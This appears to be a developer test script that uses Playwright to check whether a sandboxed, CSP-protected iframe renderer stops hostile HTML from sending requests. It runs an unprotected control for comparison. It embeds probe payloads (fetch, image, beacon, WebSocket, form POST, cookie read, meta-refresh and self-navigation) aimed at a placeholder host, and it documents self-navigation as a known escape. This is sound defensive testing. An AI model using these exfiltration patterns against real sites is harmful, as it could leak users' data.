#!/usr/bin/env python3
"""containment-proof.py — MEASURE whether contained content can reach the network.

OPTIONAL, dev-only: needs `pip install playwright && playwright install chromium`.
Not part of `npm test`; the node suite is dependency-free.

WHY THIS IS NOT JUST "count the requests":
  A CSP-blocked resource STILL FIRES a request event in most automation APIs. So
  "a request event happened" conflates BLOCKED with LEFT THE BROWSER, and a naive
  counter reports a leak that is not there -- or, worse, reports containment because
  it counted the wrong thing. The failure REASON is what separates them:
      blocked by CSP            -> contained
      ERR_NAME_NOT_RESOLVED     -> it genuinely left this process and hit DNS
  Every probe targets a host that CANNOT resolve, so those two outcomes are the only
  ones available and they are unambiguous.

AND WHY THERE IS A CONTROL ARM:
  A probe that reports "0 escapes" for the protected case proves nothing unless the
  same probe reports escapes for an UNPROTECTED one. The control mounts the identical
  hostile body with the sandbox and CSP removed. If the control does not leak, the
  instrument is broken and the result is void.
"""
import json, pathlib, sys
from playwright.sync_api import sync_playwright

HOST = "containment-probe.invalid"
HOSTILE = """
<p>contained</p>
<script>
  const U = 'http://%s/';
  try { fetch(U + 'fetch'); } catch (e) {}
  try { new Image().src = U + 'img'; } catch (e) {}
  try { navigator.sendBeacon(U + 'beacon'); } catch (e) {}
  try { new WebSocket('ws://%s/ws'); } catch (e) {}
  try { const f = document.createElement('form');
        f.method='POST'; f.action=U+'form';
        document.body.appendChild(f); f.submit(); } catch (e) {}
  try { window.__parentRead = !!parent.document.cookie; } catch (e) { window.__parentRead = 'THREW'; }
</script>
""" % (HOST, HOST)

# A DIFFERENT class of escape, and an honest one: a contained frame can navigate ITSELF.
# No CSP directive stops a document changing its own location, so `window.location=...` and
# `<meta http-equiv=refresh>` each emit an outbound GET. `allow-top-navigation` is absent, so
# this cannot move the parent page — but the GET (with data smuggled in the URL) still leaves
# the browser. Measured and reported as a KNOWN escape; it does NOT gate the verdict.
NAV_HOSTILE = """
<meta http-equiv="refresh" content="0;url=http://%s/meta-refresh">
<p>contained</p>
<script>
  try { window.location = 'http://%s/self-navigation'; } catch (e) {}
</script>
""" % (HOST, HOST)

PAGE = """<!doctype html><meta charset=utf-8><body>
<script>
  window.mountProtected = body => {
    const f = SandboxRender.frameFor(body, 'probe');
    document.body.appendChild(f);
  };
  window.mountUNPROTECTED = body => {           // the control: no sandbox, no CSP
    const f = document.createElement('iframe');
    f.srcdoc = '<!doctype html><html><head></head><body>' + body + '</body></html>';
    document.body.appendChild(f);
  };
</script></body>"""

def classify(failures, requests):
    """-> (escaped, contained) by FAILURE REASON, never by request count. FAIL-CLOSED:
    a probe counts as CONTAINED only on an EXPLICIT csp/blocked reason. Any other failure
    reason -- and any probe request that did NOT fail at all -- counts as ESCAPED, because
    an unrecognised outcome is not evidence of containment."""
    escaped, contained = [], []
    failed_urls = set()
    for url, err in failures:
        if HOST not in url: continue
        failed_urls.add(url)
        e = (err or "").lower()
        if "csp" in e or "blocked" in e:        # net::ERR_BLOCKED_BY_CSP / _BY_CLIENT
            contained.append((url, err))
        else:                                   # name_not_resolved, connection, aborted, unknown → escape
            escaped.append((url, err))
    # A probe request that never surfaced a failure event got out (or got a response) — escape.
    for url in requests:
        if HOST in url and url not in failed_urls:
            escaped.append((url, "no failure event — request left the browser"))
    return escaped, contained

def run(pw, mount, body=HOSTILE):
    failures, requests = [], []
    b = pw.chromium.launch(headless=True)
    pg = b.new_context().new_page()
    pg.on("requestfailed", lambda r: failures.append((r.url, r.failure)))
    pg.on("request", lambda r: requests.append(r.url))
    pg.set_content(PAGE)
    pg.add_script_tag(path=str(pathlib.Path("sandbox-render.js").resolve()))
    pg.wait_for_timeout(300)
    pg.evaluate(f"window.{mount}({json.dumps(body)})")
    pg.wait_for_timeout(2500)
    frame_read = None
    for fr in pg.frames:
        if fr == pg.main_frame: continue
        try: frame_read = fr.evaluate("window.__parentRead")
        except Exception: frame_read = "UNREACHABLE(opaque origin)"
    b.close()
    esc, cont = classify(failures, requests)
    return {"escaped": esc, "contained": cont,
            "probe_requests_seen": sum(1 for u in requests if HOST in u),
            "parent_read": frame_read}

with sync_playwright() as pw:
    prot = run(pw, "mountProtected")
    ctrl = run(pw, "mountUNPROTECTED")
    nav  = run(pw, "mountProtected", NAV_HOSTILE)

print("=== PROTECTED (SandboxRender.frameFor) ===")
print(f"  requests the naive counter would see : {prot['probe_requests_seen']}")
print(f"  actually LEFT the browser            : {len(prot['escaped'])}")
print(f"  blocked before the network           : {len(prot['contained'])}")
for u, e in prot["contained"]: print(f"     contained  {u.split('/')[-1]:8} <- {e}")
for u, e in prot["escaped"]:   print(f"     ESCAPED    {u.split('/')[-1]:8} <- {e}")
print(f"  read parent document                 : {prot['parent_read']}")

print("\n=== CONTROL (no sandbox, no CSP — same body) ===")
print(f"  actually LEFT the browser            : {len(ctrl['escaped'])}")
for u, e in ctrl["escaped"]: print(f"     ESCAPED    {u.split('/')[-1]:8} <- {e}")
print(f"  read parent document                 : {ctrl['parent_read']}")

print("\n=== SELF-NAVIGATION (KNOWN ESCAPE — reported, does NOT gate the verdict) ===")
print("  A contained frame can navigate ITSELF (window.location / <meta refresh>).")
print("  No CSP directive blocks that, so this GET leaves the browser BY DESIGN —")
print("  data-bearing beacons via self-navigation are NOT fully prevented.")
print(f"  outbound GET via self-navigation      : {len(nav['escaped'])}")
for u, e in nav["escaped"]: print(f"     KNOWN-ESC  {u.split('/')[-1]:14} <- {e}")

ok_instrument = len(ctrl["escaped"]) > 0
ok_contained  = len(prot["escaped"]) == 0
print("\n--- VERDICT ---")
print(f"  instrument can detect an escape : {'YES' if ok_instrument else 'NO — RESULT IS VOID'}")
print(f"  protected frame contained       : {'YES' if ok_contained else 'NO'}")
sys.exit(0 if (ok_instrument and ok_contained) else 1)
